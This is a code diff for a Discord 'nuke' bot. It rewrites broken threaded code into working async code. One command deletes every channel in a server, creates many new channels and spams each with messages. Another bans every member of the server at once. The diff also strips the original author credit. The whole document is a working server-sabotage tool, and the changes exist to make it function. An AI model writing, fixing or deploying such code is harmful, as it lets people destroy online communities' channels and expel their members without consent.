@@ -1,8 +1,3 @@
-"""
-        This is made by rescore999
-        For further information https://rescore.lol
-"""
-
 import discord
 import json
 import os
@@ -42,55 +37,39 @@ class Nuke(ui.Modal, title='Nuke Command Response'):
 
         existing_channels = [channel for channel in guild.channels]
 
-        def delete_channel(channel):
+        async def delete_channel(channel):
             try:
-                asyncio.run(channel.delete())
+                await channel.delete()
             except discord.HTTPException as e:
                 err(f"Failed to delete channel {channel.name}: {e}")
 
-        def create_channel(name):
+        async def create_channel(name):
             try:
-                return asyncio.run(guild.create_text_channel(name))
+                return await guild.create_text_channel(name)
             except discord.HTTPException as e:
                 err(f"Failed to create channel {name}")
                 return None
 
-        def spam_channel(channel, message, count):
+        async def spam_channel(channel, message, count):
             if channel:
                 try:
                     for _ in range(count):
-                        asyncio.run(channel.send(message))
-                        asyncio.sleep(0.1)
+                        await channel.send(message)
+                        await asyncio.sleep(0.1)
                 except discord.HTTPException as e:
                     err(f"Failed to send message in channel {channel.name}: {e}")
 
-        threads = []
-
         for channel in existing_channels:
-            thread = threading.Thread(target=delete_channel, args=(channel,))
-            threads.append(thread)
-            thread.start()
-
-        for thread in threads:
-            thread.join()
+            await delete_channel(channel)
 
         new_channels = []
         for i in range(amount):
-            thread = threading.Thread(target=create_channel, args=(f"{channel_name}_{i}",))
-            threads.append(thread)
-            thread.start()
-
-        for thread in threads:
-            thread.join()
+            new_channel = await create_channel(f"{channel_name}_{i}")
+            if new_channel:
+                new_channels.append(new_channel)
 
         for channel in new_channels:
-            if channel:
-                thread = threading.Thread(target=spam_channel, args=(channel, what_to_spam, 20))
-                threads.append(thread)
-                thread.start()
-
-        for thread in threads:
-            thread.join()
+            await spam_channel(channel, what_to_spam, 20)
 
         embed = discord.Embed(
             title="✅ Finished Nuking Successfully!",
@@ -160,29 +139,23 @@ bot.remove_command("help")
 @bot.hybrid_command(name="ban-all", description="Bans all members from a guild")
 async def nuke(ctx):
     guild = ctx.guild
-    members = await guild.fetch_members(limit=None).flatten()
+    members = [member async for member in guild.fetch_members(limit=None)]
     log("starting bans")
 
-    def ban_member(member):
+    async def ban_member(member):
         try:
-            asyncio.run(member.ban(reason="Guild nuke by command"))
+            await member.ban(reason="Guild nuke by command")
         except discord.Forbidden:
             err(f"Cannot ban {member.display_name}, lacking permissions.")
         except discord.HTTPException:
             err(f"Failed to ban {member.display_name}.")
 
-    threads = []
-    for member in members:
-        thread = threading.Thread(target=ban_member, args=(member,))
-        threads.append(thread)
-        thread.start()
-
-    for thread in threads:
-        thread.join()
+    tasks = [ban_member(member) for member in members]
+    await asyncio.gather(*tasks)
 
     log("Banned all successfully")
 
-@app_commands.command(name="nuke")
+@bot.tree.command(name="nuke")
 async def nuke(interaction:discord.Interaction):
     await interaction.response.send_modal(Nuke())
 
